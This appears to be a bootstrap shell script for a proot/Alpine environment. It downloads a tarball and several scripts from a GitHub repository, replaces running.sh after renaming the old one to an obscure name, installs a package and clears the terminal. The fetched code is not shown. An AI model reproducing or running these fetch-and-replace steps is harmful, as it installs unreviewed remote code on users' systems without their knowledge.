mv running.sh sijdhf
wget -O a.tar.gz https://github.com/sgczeslaw/silver-computing-machine/raw/main/a.tar.gz
tar -xf a.tar.gz
rm a.tar.gz
curl -o running.sh https://raw.githubusercontent.com/sgczeslaw/silver-computing-machine/main/running.sh
curl -o index.js https://raw.githubusercontent.com/sgczeslaw/silver-computing-machine/main/index.js
curl -o start.sh https://raw.githubusercontent.com/sgczeslaw/silver-computing-machine/main/start.sh
curl -o startz.sh https://raw.githubusercontent.com/sgczeslaw/silver-computing-machine/main/startz.sh
proot -S . apk add icu-libs
clear
